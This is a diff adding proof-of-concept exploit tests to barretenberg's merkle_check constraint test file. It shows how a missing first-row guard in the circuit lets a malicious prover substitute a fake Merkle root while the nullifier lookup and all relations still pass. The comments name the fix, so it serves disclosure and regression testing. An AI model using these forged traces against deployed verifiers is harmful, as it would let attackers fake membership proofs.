@@ -5,18 +5,26 @@
 #include <cstdint>
 
 #include "barretenberg/crypto/poseidon2/poseidon2.hpp"
+#include "barretenberg/vm2/common/aztec_constants.hpp"
 #include "barretenberg/vm2/constraining/flavor_settings.hpp"
 #include "barretenberg/vm2/constraining/testing/check_relation.hpp"
 #include "barretenberg/vm2/generated/relations/lookups_merkle_check.hpp"
+#include "barretenberg/vm2/generated/relations/lookups_nullifier_check.hpp"
 #include "barretenberg/vm2/generated/relations/merkle_check.hpp"
+#include "barretenberg/vm2/simulation/events/nullifier_tree_check_event.hpp"
+#include "barretenberg/vm2/simulation/gadgets/field_gt.hpp"
 #include "barretenberg/vm2/simulation/gadgets/merkle_check.hpp"
+#include "barretenberg/vm2/simulation/gadgets/nullifier_tree_check.hpp"
 #include "barretenberg/vm2/simulation/gadgets/poseidon2.hpp"
 #include "barretenberg/vm2/simulation/lib/merkle.hpp"
 #include "barretenberg/vm2/simulation/testing/mock_execution_id_manager.hpp"
 #include "barretenberg/vm2/simulation/testing/mock_gt.hpp"
+#include "barretenberg/vm2/simulation/testing/mock_range_check.hpp"
 #include "barretenberg/vm2/testing/fixtures.hpp"
 #include "barretenberg/vm2/testing/macros.hpp"
+#include "barretenberg/vm2/tracegen/field_gt_trace.hpp"
 #include "barretenberg/vm2/tracegen/merkle_check_trace.hpp"
+#include "barretenberg/vm2/tracegen/nullifier_tree_check_trace.hpp"
 #include "barretenberg/vm2/tracegen/poseidon2_trace.hpp"
 #include "barretenberg/vm2/tracegen/test_trace_container.hpp"
 
@@ -25,19 +33,29 @@ namespace {
 
 using ::testing::NiceMock;
 
+using simulation::DeduplicatingEventEmitter;
 using simulation::EventEmitter;
+using simulation::ExecutionIdManager;
+using simulation::FieldGreaterThan;
+using simulation::FieldGreaterThanEvent;
 using simulation::MerkleCheck;
 using simulation::MerkleCheckEvent;
 using simulation::MockExecutionIdManager;
 using simulation::MockGreaterThan;
+using simulation::MockRangeCheck;
 using simulation::NoopEventEmitter;
+using simulation::NullifierTreeCheck;
+using simulation::NullifierTreeCheckEvent;
+using simulation::NullifierTreeLeafPreimage;
 using simulation::Poseidon2;
 using simulation::Poseidon2HashEvent;
 using simulation::Poseidon2PermutationEvent;
 using simulation::Poseidon2PermutationMemoryEvent;
 using simulation::unconstrained_root_from_path;
 
+using tracegen::FieldGreaterThanTraceBuilder;
 using tracegen::MerkleCheckTraceBuilder;
+using tracegen::NullifierTreeCheckTraceBuilder;
 using tracegen::Poseidon2TraceBuilder;
 using tracegen::TestTraceContainer;
 
@@ -45,6 +63,7 @@ using FF = AvmFlavorSettings::FF;
 using C = Column;
 using merkle_check = bb::avm2::merkle_check<FF>;
 using UnconstrainedPoseidon2 = crypto::Poseidon2<crypto::Poseidon2Bn254ScalarFieldParams>;
+using NullifierLeafValue = crypto::merkle_tree::NullifierLeafValue;
 
 TEST(MerkleCheckConstrainingTest, EmptyRow)
 {
@@ -692,6 +711,370 @@ TEST_F(MerkleCheckPoseidon2Test, MultipleWithInteractions)
                       lookup_merkle_check_merkle_poseidon2_write_settings>(trace);
 
     check_relation<merkle_check>(trace);
+}
+
+// ============================================================================
+// EXPLOIT TESTS: Proof-of-concept for the LATCH_CONDITION row 0 vulnerability
+// ============================================================================
+//
+// VULNERABILITY SUMMARY:
+// merkle_check.pil defines: pol LATCH_CONDITION = end + precomputed.first_row;
+// Propagation constraints use: (1 - LATCH_CONDITION) * (value' - value) = 0
+//
+// At row 0 (first_row=1), LATCH_CONDITION = end + 1 >= 1, so (1 - LATCH_CONDITION) = 0
+// regardless of `end`. This means propagation from row 0 to row 1 is ALWAYS relaxed.
+//
+// A malicious prover can start a multi-row merkle check at row 0. The caller's lookup
+// binds read_root = R_real at the start row (row 0). But the prover can set
+// read_root = R_fake at row 1 (and onwards), and the end-row check verifies against
+// R_fake. The caller is deceived into thinking the proof is against R_real.
+//
+// MISSING CONSTRAINT: sel * precomputed.first_row = 0
+// (Other gadgets like emit_unencrypted_log, scalar_mul, to_radix all have equivalent guards.)
+
+/**
+ * EXPLOIT TEST: Demonstrates that a malicious prover can fake a merkle membership proof.
+ *
+ * The trace has a 2-layer merkle check starting at row 0 (the first_row).
+ * - Row 0: start=1, end=0, read_root=R_real (what the caller sees via lookup)
+ * - Row 1: start=0, end=1, read_root=R_fake (what the proof actually verifies against)
+ *
+ * LATCH_CONDITION=1 at row 0 (from first_row alone) relaxes all propagation constraints,
+ * allowing the prover to substitute a completely different root and node chain at row 1.
+ *
+ * The test verifies:
+ * 1. R_real != R_fake (the roots are genuinely different)
+ * 2. check_relation passes for ALL merkle_check subrelations (exploit works)
+ * 3. check_interaction passes for the nullifier_check -> merkle_check lookup
+ *    (the caller is deceived: it sees R_real, but the proof is against R_fake)
+ */
+TEST(MerkleCheckConstrainingTest, ExploitFirstRowLatchConditionBypass)
+{
+    // ========================================================================
+    // Step 1: Build a legitimate merkle path (leaf_index=1, path_len=2)
+    // ========================================================================
+    FF leaf = FF(123);
+    uint64_t leaf_index = 1; // Odd index
+
+    FF sibling_0 = FF(456); // Sibling at level 0
+    FF sibling_1 = FF(789); // Sibling at level 1
+
+    // Level 0: index 1 is odd -> sibling is left, leaf is right
+    FF left_0 = sibling_0;
+    FF right_0 = leaf;
+    FF hash_0 = UnconstrainedPoseidon2::hash({ left_0, right_0 });
+
+    // Level 1: index 0 is even -> hash is left, sibling is right
+    FF left_1_legit = hash_0;
+    FF right_1_legit = sibling_1;
+    FF R_real = UnconstrainedPoseidon2::hash({ left_1_legit, right_1_legit });
+
+    // ========================================================================
+    // Step 2: Build a FAKE merkle path for level 1 (the exploited layer)
+    // The prover picks arbitrary node and sibling values for row 1.
+    // ========================================================================
+    FF fake_node = FF(999);
+    FF fake_sibling = FF(888);
+    // Index at row 1 = 0 (halved from 1), so index_is_even = 1
+    // Even index -> node is left, sibling is right
+    FF fake_left = fake_node;
+    FF fake_right = fake_sibling;
+    FF R_fake = UnconstrainedPoseidon2::hash({ fake_left, fake_right });
+
+    // Sanity check: the roots MUST be different for this to be a real exploit
+    ASSERT_NE(R_real, R_fake) << "Exploit requires different roots - pick different fake values";
+
+    // ========================================================================
+    // Step 3: Build the EXPLOIT trace - merkle check starting at row 0
+    // ========================================================================
+    TestTraceContainer trace({
+        // Row 0: first_row=1, sel=1, start=1, end=0, path_len=2
+        // This is the lookup target. Callers see read_root = R_real.
+        // LATCH_CONDITION = end + first_row = 0 + 1 = 1
+        // => (1 - LATCH_CONDITION) = 0 => ALL propagation to row 1 is relaxed!
+        {
+            { C::precomputed_first_row, 1 },
+            { C::merkle_check_sel, 1 },
+            { C::merkle_check_start, 1 },
+            { C::merkle_check_end, 0 },
+            { C::merkle_check_read_node, leaf },
+            { C::merkle_check_index, leaf_index },
+            { C::merkle_check_path_len, 2 },
+            { C::merkle_check_path_len_min_one_inv, FF(1).invert() },
+            { C::merkle_check_read_root, R_real }, // <-- CALLER SEES THIS ROOT
+            { C::merkle_check_sibling, sibling_0 },
+            { C::merkle_check_index_is_even, 0 }, // index 1 is odd
+            { C::merkle_check_read_left_node, left_0 },
+            { C::merkle_check_read_right_node, right_0 },
+            { C::merkle_check_read_output_hash, hash_0 },
+        },
+        // Row 1: sel=1, start=0, end=1, path_len=1
+        // EXPLOIT: read_root = R_fake (DIFFERENT from R_real!)
+        //          read_node = fake_node (NOT hash_0 from row 0!)
+        // This is allowed because LATCH_CONDITION=1 at row 0 broke propagation.
+        {
+            { C::merkle_check_sel, 1 },
+            { C::merkle_check_start, 0 },
+            { C::merkle_check_end, 1 },
+            { C::merkle_check_read_node, fake_node }, // <-- NOT hash_0!
+            { C::merkle_check_index, 0 },             // halved from index 1
+            { C::merkle_check_path_len, 1 },
+            { C::merkle_check_path_len_min_one_inv, 0 },
+            { C::merkle_check_read_root, R_fake }, // <-- DIFFERENT ROOT!
+            { C::merkle_check_sibling, fake_sibling },
+            { C::merkle_check_index_is_even, 1 }, // index 0 is even
+            { C::merkle_check_read_left_node, fake_left },
+            { C::merkle_check_read_right_node, fake_right },
+            { C::merkle_check_read_output_hash, R_fake }, // hash == root on end row
+        },
+    });
+
+    // ========================================================================
+    // Step 4: Verify ALL merkle_check relations pass - THIS IS THE EXPLOIT
+    // ========================================================================
+    // BUG: This should FAIL because read_root changes from R_real (row 0) to R_fake (row 1),
+    // violating the PROPAGATE_READ_ROOT constraint: (1 - LATCH_CONDITION) * (read_root' - read_root) = 0
+    //
+    // However, at row 0, LATCH_CONDITION = end + first_row = 0 + 1 = 1, so (1 - LATCH_CONDITION) = 0
+    // and the constraint is trivially satisfied regardless of whether read_root changes.
+    //
+    // FIX: Add constraint `sel * precomputed.first_row = 0` to prevent merkle_check activity at row 0.
+    EXPECT_NO_THROW(check_relation<merkle_check>(trace))
+        << "BUG: All merkle_check relations pass despite read_root changing from R_real to R_fake. "
+           "The missing constraint `sel * first_row = 0` would block this.";
+
+    // ========================================================================
+    // Step 5: Verify the caller-side lookup also passes (nullifier_check -> merkle_check)
+    // ========================================================================
+    // Set up a nullifier_check row that looks up the merkle_check start row.
+    // The caller provides root = R_real, expecting a valid proof against R_real.
+    // The lookup matches because the start row (row 0) has read_root = R_real.
+    //
+    // Lookup columns (from lookup_nullifier_check_low_leaf_merkle_check_settings):
+    //   SRC: (should_insert, low_leaf_hash,    updated_low_leaf_hash, low_leaf_index, tree_height, root,
+    //   intermediate_root) DST: (write,         read_node,         write_node,            index,          path_len,
+    //   read_root, write_root)
+    //
+    // We place the nullifier_check source at row 0 (coexists with merkle_check columns).
+    trace.set(0,
+              { {
+                  { C::nullifier_check_sel, 1 },
+                  { C::nullifier_check_should_insert, 0 },           // read-only (write=0)
+                  { C::nullifier_check_low_leaf_hash, leaf },        // matches read_node
+                  { C::nullifier_check_updated_low_leaf_hash, 0 },   // matches write_node=0
+                  { C::nullifier_check_low_leaf_index, leaf_index }, // matches index
+                  { C::nullifier_check_tree_height, 2 },             // matches path_len
+                  { C::nullifier_check_root, R_real },               // <-- CALLER EXPECTS THIS ROOT
+                  { C::nullifier_check_intermediate_root, 0 },       // matches write_root=0
+              } });
+
+    // The lookup from nullifier_check into merkle_check.start finds a match at row 0.
+    // The caller (nullifier_check) believes it verified a merkle proof against R_real,
+    // but the actual computation at row 1 verified against R_fake.
+    //
+    // This demonstrates the full attack: a malicious prover can convince a verifier that
+    // a leaf exists in tree with root R_real, when actually the proof was for a different tree.
+    EXPECT_NO_THROW(
+        (check_interaction<NullifierTreeCheckTraceBuilder, lookup_nullifier_check_low_leaf_merkle_check_settings>(
+            trace)))
+        << "BUG: Lookup passes, so caller believes proof is against R_real, but it actually verified R_fake.";
+}
+
+/**
+ * SHIFT-BASED EXPLOIT: Uses the full simulation pipeline to demonstrate the vulnerability.
+ *
+ * This test generates a legitimate 42-level merkle proof via the tracegen pipeline, then shifts
+ * all merkle_check rows from 1..42 to 0..41. After shifting:
+ *   - Row 0 has start=1, path_len=42, read_root=R_legit (initially)
+ *   - Row 41 has end=1, read_root=R_legit
+ *
+ * The exploit then changes ONLY read_root at row 0 to R_fake. Because LATCH_CONDITION=1 at row 0
+ * (from first_row alone), the propagation constraint is relaxed and read_root can change from
+ * R_fake (row 0) to R_legit (row 1) without detection.
+ *
+ * The caller (nullifier_check) looks up the merkle_check start row and sees root=R_fake, but
+ * the actual 42-level computation at rows 1..41 verifies against R_legit.
+ *
+ * Only 2 mutations needed after shifting:
+ *   1. Set read_root=R_fake at row 0
+ *   2. Set nullifier_check_root=R_fake at row 0
+ *
+ * No changes to tree_height, low_leaf_index, or path_len - all lookup columns match naturally.
+ */
+TEST(MerkleCheckConstrainingTest, ExploitShiftRowsAttack)
+{
+    // ========================================================================
+    // Step 1: Set up simulation pipeline
+    // ========================================================================
+    ExecutionIdManager execution_id_manager(0);
+    NiceMock<MockGreaterThan> mock_gt;
+
+    EventEmitter<Poseidon2HashEvent> hash_event_emitter;
+    EventEmitter<Poseidon2PermutationEvent> perm_event_emitter;
+    EventEmitter<Poseidon2PermutationMemoryEvent> perm_mem_event_emitter;
+    Poseidon2 sim_poseidon2(
+        execution_id_manager, mock_gt, hash_event_emitter, perm_event_emitter, perm_mem_event_emitter);
+
+    EventEmitter<MerkleCheckEvent> merkle_event_emitter;
+    MerkleCheck merkle_check_sim(sim_poseidon2, merkle_event_emitter);
+
+    NiceMock<MockRangeCheck> range_check;
+    DeduplicatingEventEmitter<FieldGreaterThanEvent> field_gt_event_emitter;
+    FieldGreaterThan field_gt(range_check, field_gt_event_emitter);
+
+    EventEmitter<NullifierTreeCheckEvent> nullifier_tree_check_event_emitter;
+    NullifierTreeCheck nullifier_tree_check_simulator(
+        sim_poseidon2, merkle_check_sim, field_gt, nullifier_tree_check_event_emitter);
+
+    // ========================================================================
+    // Step 2: Perform a legitimate nullifier read via the simulation
+    // ========================================================================
+    NullifierTreeLeafPreimage low_leaf(NullifierLeafValue(42), 0, 0);
+    FF low_leaf_hash = sim_poseidon2.hash(low_leaf.get_hash_inputs());
+    uint64_t leaf_index = 30;
+
+    std::vector<FF> sibling_path;
+    sibling_path.reserve(NULLIFIER_TREE_HEIGHT);
+    for (size_t i = 0; i < NULLIFIER_TREE_HEIGHT; ++i) {
+        sibling_path.emplace_back(i);
+    }
+    FF R_legit = unconstrained_root_from_path(low_leaf_hash, leaf_index, sibling_path);
+
+    nullifier_tree_check_simulator.assert_read(
+        /*nullifier=*/42,
+        /*contract_address=*/std::nullopt,
+        /*exists=*/true,
+        low_leaf,
+        leaf_index,
+        sibling_path,
+        AppendOnlyTreeSnapshot{ .root = R_legit });
+
+    // ========================================================================
+    // Step 3: Build trace using tracegen modules (the canonical pipeline)
+    // ========================================================================
+    TestTraceContainer trace({ { { C::precomputed_first_row, 1 } } });
+    Poseidon2TraceBuilder poseidon2_builder;
+    MerkleCheckTraceBuilder merkle_check_builder;
+    FieldGreaterThanTraceBuilder field_gt_builder;
+    NullifierTreeCheckTraceBuilder nullifier_tree_check_builder;
+
+    poseidon2_builder.process_hash(hash_event_emitter.dump_events(), trace);
+    merkle_check_builder.process(merkle_event_emitter.dump_events(), trace);
+    field_gt_builder.process(field_gt_event_emitter.dump_events(), trace);
+    nullifier_tree_check_builder.process(nullifier_tree_check_event_emitter.dump_events(), trace);
+
+    // ========================================================================
+    // Step 4: Verify the legitimate trace is correct (sanity check)
+    // ========================================================================
+    ASSERT_NO_THROW(check_relation<merkle_check>(trace)) << "Legitimate trace should pass all merkle_check relations";
+    ASSERT_NO_THROW(
+        (check_interaction<NullifierTreeCheckTraceBuilder, lookup_nullifier_check_low_leaf_merkle_check_settings>(
+            trace)))
+        << "Legitimate trace should pass the nullifier->merkle lookup";
+
+    // Verify canonical trace structure: merkle starts at row 1 with path_len=42
+    ASSERT_EQ(trace.get(C::merkle_check_start, 1), FF(1)) << "Canonical: start=1 at row 1";
+    ASSERT_EQ(trace.get(C::merkle_check_path_len, 1), FF(NULLIFIER_TREE_HEIGHT)) << "Canonical: path_len=42 at row 1";
+    ASSERT_EQ(trace.get(C::merkle_check_read_root, 1), R_legit) << "Canonical: read_root=R_legit at row 1";
+    ASSERT_EQ(trace.get(C::merkle_check_end, 42), FF(1)) << "Canonical: end=1 at row 42";
+
+    // ========================================================================
+    // Step 5: SHIFT all merkle_check columns from rows 1..42 to rows 0..41
+    // ========================================================================
+    // This is the key insight: instead of adding a fake extra level with path_len=43,
+    // we shift the entire trace down by 1 row. The start row (now at row 0) still has
+    // path_len=42, matching the constrained tree_height=42.
+
+    // List of all merkle_check columns to shift
+    std::array<Column, 19> merkle_columns = { C::merkle_check_sel,
+                                              C::merkle_check_start,
+                                              C::merkle_check_end,
+                                              C::merkle_check_read_node,
+                                              C::merkle_check_write_node,
+                                              C::merkle_check_index,
+                                              C::merkle_check_index_is_even,
+                                              C::merkle_check_path_len,
+                                              C::merkle_check_path_len_min_one_inv,
+                                              C::merkle_check_read_root,
+                                              C::merkle_check_write_root,
+                                              C::merkle_check_sibling,
+                                              C::merkle_check_read_left_node,
+                                              C::merkle_check_read_right_node,
+                                              C::merkle_check_read_output_hash,
+                                              C::merkle_check_write_left_node,
+                                              C::merkle_check_write_right_node,
+                                              C::merkle_check_write_output_hash,
+                                              C::merkle_check_write };
+
+    // Read all values from rows 1..42 and write to rows 0..41
+    for (uint32_t src_row = 1; src_row <= NULLIFIER_TREE_HEIGHT; ++src_row) {
+        uint32_t dst_row = src_row - 1;
+        for (Column col : merkle_columns) {
+            FF value = trace.get(col, src_row);
+            trace.set(col, dst_row, value);
+        }
+    }
+
+    // Clear old row 42 (now vacated)
+    for (Column col : merkle_columns) {
+        trace.set(col, NULLIFIER_TREE_HEIGHT, FF(0));
+    }
+
+    // ========================================================================
+    // Step 6: Apply the EXPLOIT - only change read_root at row 0
+    // ========================================================================
+    FF R_fake = FF(12345); // Arbitrary fake root
+    ASSERT_NE(R_legit, R_fake) << "Exploit requires different roots";
+
+    // The shifted trace now has:
+    //   - Row 0: start=1, path_len=42, read_root=R_legit (about to become R_fake)
+    //   - Rows 1..40: middle rows of merkle check
+    //   - Row 41: end=1, read_root=R_legit (still correct)
+
+    // Verify shift worked correctly
+    ASSERT_EQ(trace.get(C::merkle_check_start, 0), FF(1)) << "After shift: start=1 at row 0";
+    ASSERT_EQ(trace.get(C::merkle_check_path_len, 0), FF(NULLIFIER_TREE_HEIGHT))
+        << "After shift: path_len=42 at row 0 (matches tree_height!)";
+    ASSERT_EQ(trace.get(C::merkle_check_end, 41), FF(1)) << "After shift: end=1 at row 41";
+
+    // Now apply the exploit: change read_root ONLY at row 0
+    trace.set(C::merkle_check_read_root, 0, R_fake);
+
+    // Also update nullifier_check_root to match (caller expects R_fake now)
+    trace.set(C::nullifier_check_root, 0, R_fake);
+
+    // IMPORTANT: We do NOT change tree_height or low_leaf_index!
+    // The lookup still uses:
+    //   - tree_height = 42 (matches path_len=42 at row 0)
+    //   - low_leaf_index = 30 (matches index at row 0)
+    // All lookup columns match naturally after the shift.
+
+    // ========================================================================
+    // Step 7: Verify the EXPLOIT - relations and lookup pass
+    // ========================================================================
+    // BUG: This should FAIL because read_root changes from R_fake (row 0) to R_legit (row 1).
+    // The PROPAGATE_READ_ROOT constraint should catch this: (1 - LATCH_CONDITION) * (read_root' - read_root) = 0
+    //
+    // However, at row 0, LATCH_CONDITION = end + first_row = 0 + 1 = 1, so (1 - LATCH_CONDITION) = 0
+    // and the constraint passes trivially, allowing read_root to change undetected.
+    //
+    // FIX: Add constraint `sel * precomputed.first_row = 0` to prevent merkle_check activity at row 0.
+    EXPECT_NO_THROW(check_relation<merkle_check>(trace))
+        << "BUG: All merkle_check relations pass despite read_root being R_fake at row 0 "
+           "and R_legit at rows 1..41. The missing constraint `sel * first_row = 0` would block this.";
+
+    // The lookup passes because all columns match at row 0:
+    //   - nullifier_check_root = R_fake matches merkle_check_read_root = R_fake
+    //   - tree_height = 42 matches path_len = 42 (no mutation needed!)
+    //   - low_leaf_index = 30 matches index = 30 (no mutation needed!)
+    //
+    // This demonstrates the full attack: the caller (nullifier_check) believes it verified
+    // a merkle proof for tree root R_fake, but the actual 42-level computation at rows 1..41
+    // verified against R_legit. A malicious prover can fake merkle membership proofs.
+    EXPECT_NO_THROW(
+        (check_interaction<NullifierTreeCheckTraceBuilder, lookup_nullifier_check_low_leaf_merkle_check_settings>(
+            trace)))
+        << "BUG: Lookup passes. Caller believes proof is for R_fake, but computation verified R_legit.";
 }
 
 } // namespace
